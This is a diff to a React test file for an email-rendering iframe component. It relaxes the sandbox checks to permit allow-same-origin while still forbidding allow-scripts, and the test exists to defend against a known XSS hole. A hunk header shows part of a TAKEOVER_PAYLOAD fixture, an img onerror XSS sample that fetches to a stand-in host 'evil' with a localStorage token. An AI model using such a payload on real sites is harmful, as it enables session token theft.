@@ -12,6 +12,14 @@
  * These tests assert the two independent controls that close it: the sandbox
  * flags, and the DOMPurify pass. Either alone would be enough; both are
  * required to stay.
+ *
+ * The sandbox assertions were relaxed from "never allow-same-origin" to the
+ * invariant that actually closes the hole: NEVER allow-scripts, and never the
+ * two together. allow-same-origin was added deliberately, because without it
+ * the parent cannot measure the frame and every email rendered at a fixed
+ * height with its own scrollbar. Per the HTML sandbox rules allow-same-origin
+ * does not enable scripting, and the takeover payload needs scripting to run —
+ * so the attack stays dead. See the comment on the iframe in EmailBody.jsx.
  */
 import { render, screen } from '@testing-library/react'
 import { describe, expect, it } from 'vitest'
@@ -24,14 +32,25 @@ const TAKEOVER_PAYLOAD = `<img src=x onerror="fetch('//evil/?t='+localStorage.to
 const getFrame = () => screen.getByTitle('Email message')
 
 describe('EmailBody — iframe sandbox', () => {
-  it('grants allow-popups only, never allow-scripts or allow-same-origin', () => {
+  it('never grants allow-scripts — the flag the takeover needed', () => {
     render(<EmailBody html="<p>hello</p>" title="Email message" />)
 
     const sandbox = getFrame().getAttribute('sandbox')
 
-    expect(sandbox).toBe('allow-popups allow-popups-to-escape-sandbox')
+    // The exact set, so ANY addition has to come through this test.
+    expect(sandbox).toBe('allow-same-origin allow-popups allow-popups-to-escape-sandbox')
     expect(sandbox).not.toContain('allow-scripts')
-    expect(sandbox).not.toContain('allow-same-origin')
+  })
+
+  it('never grants allow-scripts and allow-same-origin together', () => {
+    render(<EmailBody html="<p>hello</p>" title="Email message" />)
+
+    const sandbox = getFrame().getAttribute('sandbox')
+    const scripts = sandbox.includes('allow-scripts')
+    const sameOrigin = sandbox.includes('allow-same-origin')
+
+    // That pair voids the sandbox entirely. It is the audit's P0-1.
+    expect(scripts && sameOrigin).toBe(false)
   })
 
   it('keeps the sandbox locked down even for hostile input', () => {
@@ -39,7 +58,8 @@ describe('EmailBody — iframe sandbox', () => {
 
     const sandbox = getFrame().getAttribute('sandbox')
     expect(sandbox).not.toContain('allow-scripts')
-    expect(sandbox).not.toContain('allow-same-origin')
+    // Scripting stays off, so the onerror in the payload can never fire.
+    expect(sandbox.includes('allow-scripts') && sandbox.includes('allow-same-origin')).toBe(false)
   })
 
   it('does not leak the parent origin via referrer', () => {
